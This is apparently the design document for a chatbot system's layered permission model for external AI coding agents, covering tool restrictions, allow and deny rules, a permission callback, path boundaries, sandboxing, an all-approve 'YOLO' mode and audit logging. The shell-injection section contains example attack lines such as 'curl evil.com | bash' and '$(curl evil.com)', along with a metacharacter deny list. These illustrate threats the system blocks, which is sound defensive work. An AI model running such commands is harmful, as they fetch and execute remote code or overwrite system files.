# Agent Permission Design

This document describes AIr-Friends' multi-layer permission model for controlling what external ACP Agents (GitHub Copilot CLI, Gemini CLI, OpenCode CLI) can do during a session.

## Table of Contents

- [Design Principles](#design-principles)
- [Permission Layers Overview](#permission-layers-overview)
- [Layer 1 — Agent-Level Tool Restrictions](#layer-1--agent-level-tool-restrictions)
- [Layer 2 — OpenCode Permission Configuration](#layer-2--opencode-permission-configuration)
- [Layer 3 — ACP Client Permission Gate](#layer-3--acp-client-permission-gate)
- [Layer 4 — File Access Boundary](#layer-4--file-access-boundary)
- [Layer 5 — Sandbox Isolation](#layer-5--sandbox-isolation)
- [YOLO Mode](#yolo-mode)
- [Per-Session-Type Permission Behavior](#per-session-type-permission-behavior)
- [Per-Agent-Type Differences](#per-agent-type-differences)
- [Skill Auto-Approve List](#skill-auto-approve-list)
- [Permission Audit Logging](#permission-audit-logging)
- [Security Considerations](#security-considerations)
- [Configuration Reference](#configuration-reference)

---

## Design Principles

AIr-Friends is a **non-interactive** system — there is no human operator to approve or reject permission prompts during an agent session. This drives several key design choices:

1. **Default-deny**: Unknown tool calls and commands are rejected, not queued for approval.
2. **Defense in depth**: Permissions are enforced at multiple independent layers. Even if one layer is misconfigured, others prevent unauthorized access.
3. **Whitelist-only in restricted mode**: Only known skills and safe commands are auto-approved; everything else is rejected.
4. **Minimal privilege**: Each agent type receives only the environment variables and tools it needs.
5. **Per-channel granularity**: YOLO mode (all-approve) can be selectively enabled for trusted accounts/channels while the rest of the system runs in restricted mode.

---

## Permission Layers Overview

```text
┌───────────────────────────────────────────────────────────────────┐
│ Layer 1: Agent-Level Tool Restrictions                            │
│ (CLI flags that limit what tools the agent CLI exposes)           │
├───────────────────────────────────────────────────────────────────┤
│ Layer 2: OpenCode Permission Configuration (opencode.json)        │
│ (OpenCode-specific: fine-grained allow/deny per tool & pattern)   │
├───────────────────────────────────────────────────────────────────┤
│ Layer 3: ACP Client Permission Gate                               │
│ (ChatbotClient.requestPermission() — whitelist-based approval)    │
├───────────────────────────────────────────────────────────────────┤
│ Layer 4: File Access Boundary                                     │
│ (readTextFile/writeTextFile path validation)                      │
├───────────────────────────────────────────────────────────────────┤
│ Layer 5: Sandbox Isolation                                        │
│ (Env var filtering + optional network namespace isolation)        │
└───────────────────────────────────────────────────────────────────┘
```

When the external Agent requests any action, it must pass **all applicable layers**. A denial at any layer blocks the operation.

---

## Layer 1 — Agent-Level Tool Restrictions

Before the ACP permission callback is ever invoked, the agent CLI itself can be configured to only expose certain tools.

### Copilot (non-YOLO)

In restricted mode, Copilot is launched with `--available-tools` flags that limit it to **only bash-related tools**:

```
copilot --available-tools write_bash --available-tools read_bash \
        --available-tools stop_bash --available-tools bash \
        --disable-builtin-mcps --no-ask-user --acp
```

This means Copilot cannot use its own native `edit`, `read`, or other tools — it can only run bash commands, which are then gated by Layer 3.

### Copilot (YOLO)

```
copilot --yolo --disable-builtin-mcps --no-ask-user --acp
```

All tools are available. The `--yolo` flag tells Copilot to auto-approve all actions internally.

### Gemini

Gemini does not support tool restriction flags. In restricted mode, it runs with `--experimental-acp` only. In YOLO mode, `--yolo` is added.

### OpenCode

OpenCode does not support tool restriction via CLI flags. In restricted mode, permissions are configured entirely through `opencode.json` (Layer 2). In YOLO mode, `OPENCODE_YOLO=true` is set as an environment variable.

**Reference**: `src/acp/agent-factory.ts`

---

## Layer 2 — OpenCode Permission Configuration

OpenCode uses a JSON configuration file (`opencode.json`) for fine-grained permission control. This layer is **only applicable to the OpenCode agent** — Copilot and Gemini do not use this configuration.

> **Reference**: [OpenCode Permissions Documentation](https://opencode.ai/docs/permissions/)

### Pattern Matching Rules

- `*` matches zero or more of any character
- `?` matches exactly one character
- **Last-match-wins**: rules are evaluated in order; the last matching rule takes precedence
- Home directory expansion: `~` and `$HOME` expand to the user's home directory

### Current Configuration

The `opencode.json` in the project root configures permissions for the `build` agent (OpenCode's primary agent):

| Category                                                    | Permission   | Rationale                               |
| ----------------------------------------------------------- | ------------ | --------------------------------------- |
| **Default (`*`)**                                           | `deny`       | Non-interactive system rejects unknowns |
| **Read-only tools** (`read`, `list`, `glob`, `grep`, `lsp`) | `allow`      | Safe exploration — no side effects      |
| **Session management** (`todoread`, `todowrite`, `task`)    | `allow`      | Internal agent organization tools       |
| **Skills** (`skill`)                                        | `allow`      | Core SKILL.md discovery and loading     |
| **Web access** (`webfetch`, `websearch`, `codesearch`)      | `allow`      | Research and information gathering      |
| **Interactive** (`question`)                                | `deny`       | No human operator to answer questions   |
| **Loop protection** (`doom_loop`)                           | `deny`       | Prevent infinite retry loops            |
| **File editing** (`edit`)                                   | Scoped allow | Agent workspace paths only (see below)  |
| **Shell commands** (`bash`)                                 | Whitelist    | Specific patterns only (see below)      |
| **External directories**                                    | Restricted   | Skills and agent workspace only         |

### Edit Permission (Scoped)

File editing is denied by default, with exceptions for the agent workspace:

```json
"edit": {
  "*": "deny",
  "data/agent-workspace/**": "allow",
  "$AGENT_WORKSPACE/**": "allow",
  "/app/data/agent-workspace/**": "allow",
  "$TMPDIR/**": "allow"
}
```

This allows the self-research feature to write study notes to the agent workspace while preventing the agent from modifying source code, configuration files, or user workspace data.

### Bash Permission (Whitelist)

Shell commands use default-deny with specific allowed patterns:

| Pattern                            | Purpose                                                 |
| ---------------------------------- | ------------------------------------------------------- |
| `deno run *skills/*/scripts/*.ts*` | Execute skill scripts (memory-save, send-reply, etc.)   |
| `agent-browser *`                  | Browser automation skill (command-based)                |
| `rg *`                             | ripgrep for memory search                               |
| `curl *`                           | HTTP requests for web research                          |
| `cat *`                            | Read file contents                                      |
| `head *`, `tail *`                 | Read partial file contents                              |
| `ls *`, `find *`                   | List and find files                                     |
| `wc *`                             | Word/line counting                                      |
| `git *`                            | Denied — prevents repo state mutation                   |
| `echo *`                           | Denied — prevents arbitrary file writes via redirection |
| `mkdir *`                          | Denied — prevents arbitrary directory creation          |

### External Directory Permission

By default, OpenCode only allows file access within its working directory (the user's workspace). The `external_directory` permission grants access to additional paths:

```json
"external_directory": {
  "*": "deny",
  "~/.agents/skills/**": "allow",
  "/home/deno/.agents/skills/**": "allow",
  "/home/deno/.copilot/skills/**": "allow",
  "data/agent-workspace/**": "allow",
  "$AGENT_WORKSPACE/**": "allow",
  "/app/data/agent-workspace/**": "allow",
  "$TMPDIR/**": "allow"
}
```

**Reference**: `opencode.json`

---

## Layer 3 — ACP Client Permission Gate

The `ChatbotClient.requestPermission()` method is the core permission callback invoked by the ACP protocol whenever the external agent requests to perform any action. This layer applies to **all agent types**.

### Evaluation Order

The method evaluates permission requests in this order:

1. **YOLO check** — If `config.yolo === true`, auto-approve everything immediately.

2. **Skills directory read** — Auto-approve `read` requests where paths start with `/home/deno/.copilot/skills`. This allows agents to discover SKILL.md files.

3. **Skill command execution** — For `execute` kind requests, first reject commands containing shell injection characters (`;`, `|`, `&`, `` ` ``, `$()`, `>`, `<`, `#`, newlines), then check if **all** commands match the skill auto-approve list using safe token matching (see [Skill Auto-Approve List](#skill-auto-approve-list)).

4. **Registered skill check** — Extract skill name from `rawInput.skill` or `toolCall.title` and check against the `SkillRegistry`.

5. **Edit/write rejection** — Explicitly reject `edit`, `edit_file`, and `write` kind requests with warning logs.

6. **Default rejection** — All unrecognized tool calls are rejected with `reject_once`.

### Permission Response Options

The ACP protocol provides these response options:

- `allow_once` — Approve this specific request
- `reject_once` — Deny this specific request

In restricted mode, the client selects `allow_once` for whitelisted operations and `reject_once` for everything else. There is no "ask user" flow because AIr-Friends operates without human interaction.

**Reference**: `src/acp/client.ts`, lines 161–339

---

## Layer 4 — File Access Boundary

When the external agent uses ACP-level file operations (`readTextFile`, `writeTextFile`), `ChatbotClient` enforces a path boundary:

- Files must be within `config.workingDir` (the user's workspace directory) **or** `config.agentWorkspacePath` (the global agent workspace)
- Path validation uses `resolve()` + `startsWith()` to prevent directory traversal attacks
- Requests outside these boundaries are denied with an error

This is independent of the agent's own file access — it applies to the ACP protocol's file operation callbacks.

**Reference**: `src/acp/client.ts`, lines 444–496

---

## Layer 5 — Sandbox Isolation

The `SandboxManager` applies OS-level isolation to the agent subprocess before it starts.

### Environment Variable Filtering

When `sandbox.filterEnv` is `true` (default), the agent subprocess only receives explicitly allowed environment variables:

**Base allowed (all agent types):**

| Variable                                | Purpose                         |
| --------------------------------------- | ------------------------------- |
| `PATH`, `HOME`, `USER`, `SHELL`, `TERM` | System essentials               |
| `LANG`, `LC_ALL`                        | Locale                          |
| `DENO_DIR`, `DENO_NO_UPDATE_CHECK`      | Deno runtime                    |
| `SKILL_API_PORT`, `SESSION_ID`          | Skill API communication         |
| `AGENT_WORKSPACE`                       | Agent workspace path            |
| `TMPDIR`                                | Workspace-scoped temp directory |

**Agent-type-specific:**

| Agent    | Additional variables                                                                                        |
| -------- | ----------------------------------------------------------------------------------------------------------- |
| Copilot  | `GITHUB_TOKEN`, `COPILOT_GITHUB_TOKEN`                                                                      |
| Gemini   | `GEMINI_API_KEY`, `GEMINI_SYSTEM_MD`                                                                        |
| OpenCode | `GEMINI_API_KEY`, `OPENROUTER_API_KEY`, `OPENCODE_API_KEY`, `GOOGLE_GENERATIVE_AI_API_KEY`, `OPENCODE_YOLO` |

Additional env vars can be added via `sandbox.allowedEnvVars` config array.

### Network Isolation

When `sandbox.networkIsolation` is `true` (default: `false`), the agent command is wrapped with `unshare --net` to create a new network namespace. This prevents the agent from making any network connections directly.

- **Linux only** — gracefully skips on other platforms
- **Requires `unshare`** — gracefully skips if binary is not available

**Reference**: `src/acp/sandbox-manager.ts`

---

## YOLO Mode

YOLO mode bypasses permission restrictions at multiple layers simultaneously:

| Layer                   | YOLO Behavior                                                                                                               |
| ----------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Layer 1 (Agent CLI)     | Copilot: `--yolo` flag, no `--available-tools` restrictions. Gemini: `--yolo` flag. OpenCode: `OPENCODE_YOLO=true` env var. |
| Layer 2 (opencode.json) | Overridden by `OPENCODE_YOLO=true` — all permissions become `allow`.                                                        |
| Layer 3 (ACP Client)    | `requestPermission()` auto-approves every request.                                                                          |
| Layer 4 (File Boundary) | Unchanged — path boundaries still enforced.                                                                                 |
| Layer 5 (Sandbox)       | Unchanged — env filtering and network isolation still apply.                                                                |

### YOLO Resolution

YOLO can be enabled in two ways:

1. **Global CLI flag** (`--yolo`) — enables YOLO for all sessions. Set at application startup.
2. **Per-channel configuration** — enables YOLO for specific accounts/channels:

```yaml
channels:
  - id: "discord/account/123456789012345678"
    enabled: true
    yolo: true # YOLO for this account
```

The `getEffectiveYolo()` method resolves YOLO with priority:

1. Global `--yolo` flag → always wins
2. Per-channel `yolo: true` → checked via `ReplyPolicyEvaluator.resolveYoloDecision()`
3. Default → disabled

**Important**: Not all session types use `getEffectiveYolo()`. See [Per-Session-Type Permission Behavior](#per-session-type-permission-behavior) below.

**Reference**: `src/core/session-orchestrator.ts`, lines 102–135

---

## Per-Session-Type Permission Behavior

Different session types resolve YOLO differently based on whether they have a real platform/user/channel context:

| Session Type          | YOLO Resolution                                   | Reason                                                                          |
| --------------------- | ------------------------------------------------- | ------------------------------------------------------------------------------- |
| **message**           | `getEffectiveYolo(platform, userId, channelId)`   | Real user/channel context → per-channel config applies                          |
| **channelLurk**       | `getEffectiveYolo(platform, userId, channelId)`   | Real channel context → per-channel config applies                               |
| **spontaneous**       | `getEffectiveYolo(platform, botId, channelId)`    | Posts to real channels → per-channel config applies                             |
| **reminder**          | `getEffectiveYolo(platform, userId, dmChannelId)` | Real user DM context → per-channel config applies                               |
| **selfResearch**      | `this.yolo` (global flag only)                    | Internal session with synthetic identifiers — per-channel config is meaningless |
| **memoryMaintenance** | `this.yolo` (global flag only)                    | Internal session — same reasoning as selfResearch                               |

### Internal Sessions (selfResearch, memoryMaintenance)

These sessions use synthetic identifiers (e.g., platform=`"discord"`, userId=`"self-research"`, channelId=`"internal"`) that would never match any real channel configuration. Therefore, they bypass `getEffectiveYolo()` and use the global `--yolo` flag directly.

**Implication**: Per-channel YOLO overrides (`yolo: true` in channel config) have **no effect** on self-research or memory maintenance sessions. Only the global `--yolo` CLI flag controls their permission level.

**Reference**: `src/core/session-orchestrator.ts`

---

## Per-Agent-Type Differences

### Comparison Table

| Aspect                          | Copilot                                                                                       | Gemini                | OpenCode                     |
| ------------------------------- | --------------------------------------------------------------------------------------------- | --------------------- | ---------------------------- |
| **Binary**                      | `copilot`                                                                                     | `gemini`              | `opencode`                   |
| **ACP flag**                    | `--acp`                                                                                       | `--experimental-acp`  | `acp` (subcommand)           |
| **YOLO flag**                   | `--yolo`                                                                                      | `--yolo`              | `OPENCODE_YOLO=true` env var |
| **Tool restriction** (non-YOLO) | `--available-tools bash,read_bash,write_bash,stop_bash`                                       | None (no CLI support) | `opencode.json` (Layer 2)    |
| **Config-based permissions**    | Not supported                                                                                 | Not supported         | ✅ `opencode.json`           |
| **Extra CLI flags**             | `--disable-builtin-mcps`, `--no-ask-user`, `--no-color`, `--no-auto-update`, `--experimental` | —                     | —                            |

### How Each Agent's Permissions Interact with Layers

**Copilot** relies primarily on Layer 1 (CLI tool restriction) and Layer 3 (ACP permission gate). In non-YOLO mode, it can only use bash tools — all bash commands are then validated by Layer 3's skill auto-approve list.

**Gemini** has no CLI-level tool restriction. It relies on Layer 3 (ACP permission gate) as the primary enforcer. Any tool call Gemini attempts that isn't in the whitelist is rejected at Layer 3.

**OpenCode** has the most granular control through Layer 2 (`opencode.json`). Permission decisions are made at the opencode.json level first, then Layer 3 acts as a secondary gate for the ACP protocol.

**Reference**: `src/acp/agent-factory.ts`

---

## Skill Auto-Approve List

The skill auto-approve list determines which bash commands are automatically approved at Layer 3 in restricted mode. It contains two categories:

### Script-Based Skills

Skills with a `scripts/` directory containing `.ts` files. The auto-approve list stores **path suffixes** like `skills/memory-save/scripts/memory-save.ts`. During permission evaluation, the command is split into whitespace-delimited tokens and approved if any token **exactly equals** or **ends with `/{allowedPath}`** for any of these path suffixes. This prevents substring matches where a whitelisted path appears embedded inside a longer malicious token.

Current script-based skills:
`cancel-reminder`, `edit-reply`, `fetch-context`, `list-reminders`, `memory-export`, `memory-patch`, `memory-save`, `memory-search`, `memory-stats`, `react-message`, `send-file`, `send-reply`, `set-reminder`

### Command-Based Skills

Skills without a `scripts/` directory (e.g., `agent-browser`). The auto-approve list stores **command prefixes**. During permission evaluation, the **first whitespace-delimited token** is extracted and approved if it **exactly equals** any of these prefixes. This prevents prefix matches where a whitelisted command name is a prefix of a longer, unrelated command.

Current command-based skills: `agent-browser`, `self-research`

### Building the List

The `buildSkillAutoApproveList()` function scans two directories:

1. Built-in: `skills/` (project root)
2. External: `~/.agents/skills/` (installed external skills)

It can be configured explicitly via `agent.autoApproveSkills` in config or `AGENT_AUTO_APPROVE_SKILLS` env var. When not configured, it falls back to scanning the built-in `skills/` directory.

**Reference**: `src/acp/client.ts`, lines 25–107

### Shell Injection Protection

The skill command matching includes defense against shell injection attacks. Before any path or prefix matching occurs, commands are checked for shell meta-characters that could enable command chaining or injection:

| Character | Shell Meaning          | Attack Example                    |
| --------- | ---------------------- | --------------------------------- |
| `;`       | Command separator      | `agent-browser; curl evil.com`    |
| `\|`      | Pipe                   | `curl evil.com \| bash`           |
| `&`       | Background / AND chain | `cmd && malicious-cmd`            |
| `` ` ``   | Command substitution   | `` deno run `curl evil.com` ``    |
| `$()`     | Command substitution   | `deno run $(curl evil.com)`       |
| `>`, `<`  | Redirection            | `echo pwned > /etc/passwd`        |
| `#`       | Comment                | `curl evil.com # legitimate-path` |
| Newline   | Command separator      | Multi-line command injection      |

Commands containing any of these characters are immediately rejected, regardless of whether they also contain whitelisted paths or prefixes.

Additionally, path matching uses strict token validation:

- **Script paths** must appear as a complete whitespace-delimited token (not embedded in a substring)
- **Command prefixes** must be the exact first token (not a prefix of a longer command name)

**Reference**: `src/acp/client.ts`, `containsShellOperators()`, `matchesScriptPath()`, `matchesCommandPrefix()`

---

## Permission Audit Logging

All permission decisions (both approved and denied) can be recorded in the per-session JSONL audit log for security analysis and compliance.

### Audit Phases

| Phase                 | Description                       |
| --------------------- | --------------------------------- |
| `permission_approved` | A permission request was approved |
| `permission_denied`   | A permission request was denied   |

### Audit Entry Data

Each permission audit entry includes:

| Field            | Type                     | Description                                                         |
| ---------------- | ------------------------ | ------------------------------------------------------------------- |
| `toolName`       | `string`                 | The tool or skill name that requested permission                    |
| `permissionKind` | `string`                 | The kind of permission requested (e.g., `execute`, `read`, `write`) |
| `command`        | `string?`                | The command content (hashed when `audit.hashContent` is `true`)     |
| `decision`       | `"approved" \| "denied"` | The permission decision outcome                                     |
| `reason`         | `string`                 | The reason for the decision                                         |

### Decision Reasons

| Reason                    | Decision | Description                                      |
| ------------------------- | -------- | ------------------------------------------------ |
| `yolo_mode`               | approved | YOLO mode auto-approved the request              |
| `skills_directory_access` | approved | Read access to the skills directory              |
| `skill_whitelist`         | approved | Command matched the skill auto-approve list      |
| `registered_skill`        | approved | Tool matched a registered skill name             |
| `rejected_edit_write`     | denied   | Edit/write operation rejected in restricted mode |
| `rejected_unknown`        | denied   | Unknown tool rejected by default-deny policy     |

### Content Hashing

When `audit.hashContent` is `true`, the `command` field is SHA-256 hashed and prefixed with `sha256:` to prevent sensitive command content from appearing in audit logs.

### Phase Filtering

Permission audit phases respect the `audit.includedPhases` configuration. When `includedPhases` is empty (default), all phases including permission phases are recorded. To selectively enable permission auditing, add `permission_approved` and/or `permission_denied` to the `includedPhases` list.

---

## Security Considerations

### What Each Layer Prevents

| Threat                                  | Prevented by                                                                                            |
| --------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| Agent modifying source code             | Layer 1 (no edit tool for Copilot), Layer 2 (edit denied for OpenCode), Layer 3 (edit/write rejected)   |
| Agent running arbitrary commands        | Layer 2 (bash whitelist for OpenCode), Layer 3 (skill auto-approve list)                                |
| Agent accessing other users' data       | Layer 4 (file access boundary — workspace isolation)                                                    |
| Agent exfiltrating secrets via env vars | Layer 5 (env var filtering)                                                                             |
| Agent making unauthorized network calls | Layer 5 (optional network isolation)                                                                    |
| Agent committing/pushing to git         | Layer 2 (git denied for OpenCode), Layer 3 (not in skill list)                                          |
| Permission bypass undetected            | All permission decisions (approved and denied) are recorded in per-session audit logs with full context |

### Known Limitations

1. **Gemini has no Layer 1 restriction**: Unlike Copilot, Gemini cannot be restricted at the CLI level. It relies entirely on Layer 3 (ACP permission gate) to reject unauthorized tools. If the ACP protocol changes or has bugs, Gemini has fewer safeguards.

2. **OpenCode's Layer 2 is only as strong as opencode.json**: If the configuration file is modified or the `OPENCODE_YOLO=true` env var leaks through, all Layer 2 protections are bypassed.

3. **Layer 3 relies on shell operator detection**: Layer 3 rejects commands containing shell meta-characters (`;`, `|`, `&`, `` ` ``, `$()`, `>`, `<`, `#`, newlines) and validates script paths as complete whitespace-delimited tokens and command prefixes as exact first-token matches. While this prevents known injection patterns (command chaining, piping, comment hiding), novel shell features or encoding tricks not covered by the character set could theoretically bypass the check.

4. **Self-research and memory maintenance always run in restricted mode**: There is no way to enable per-channel YOLO for these internal sessions — only the global `--yolo` flag works. This is by design (synthetic identifiers), but means trusted-channel YOLO configs don't apply to background tasks.

---

## Configuration Reference

### Config File (`config.yaml`)

```yaml
agent:
  # Sandbox isolation for agent subprocess
  sandbox:
    filterEnv: true # Filter env vars to allowed list (default: true)
    networkIsolation: false # Linux network namespace isolation (default: false)
    allowedEnvVars: [] # Additional env var names to allow through

  # Skill auto-approve list (optional — falls back to scanning skills/ dir)
  autoApproveSkills:
    - "memory-save"
    - "memory-search"
    - "agent-browser"

# Per-channel YOLO
channels:
  - id: "discord/account/123456789012345678"
    enabled: true
    yolo: true

# Audit logging (includes permission audit phases)
audit:
  enabled: false
  retentionDays: 7
  hashContent: true
  includedPhases:
    - "skill_call"
    - "reply_sent"
    - "session_end"
    - "permission_approved"
    - "permission_denied"
```

### Environment Variables

| Variable                          | Config Path                      | Description          |
| --------------------------------- | -------------------------------- | -------------------- |
| `AGENT_SANDBOX_FILTER_ENV`        | `agent.sandbox.filterEnv`        | `"true"` / `"false"` |
| `AGENT_SANDBOX_NETWORK_ISOLATION` | `agent.sandbox.networkIsolation` | `"true"` / `"false"` |
| `AGENT_SANDBOX_ALLOWED_ENV_VARS`  | `agent.sandbox.allowedEnvVars`   | Comma-separated list |
| `AGENT_AUTO_APPROVE_SKILLS`       | `agent.autoApproveSkills`        | Comma-separated list |

### OpenCode-Specific

The `opencode.json` file in the project root configures OpenCode agent permissions. See [Layer 2](#layer-2--opencode-permission-configuration) for details. This file is only used when the agent type is `opencode`.

---

## Related Documentation

- [OpenCode Permissions](https://opencode.ai/docs/permissions/) — OpenCode's permission system documentation
- [OpenCode Tools](https://opencode.ai/docs/tools/) — Available tools and permission keys
- [OpenCode Skills](https://opencode.ai/docs/skills/) — Skills system and permissions
- [ACP Protocol Spec](https://agentclientprotocol.org/) — Agent Client Protocol specification
- [docs/DESIGN.md](DESIGN.md) — Overall system design including trust boundary model
- [docs/features/28-per-channel-yolo-permission-hardening.feature](features/28-per-channel-yolo-permission-hardening.feature) — BDD specification for permission hardening
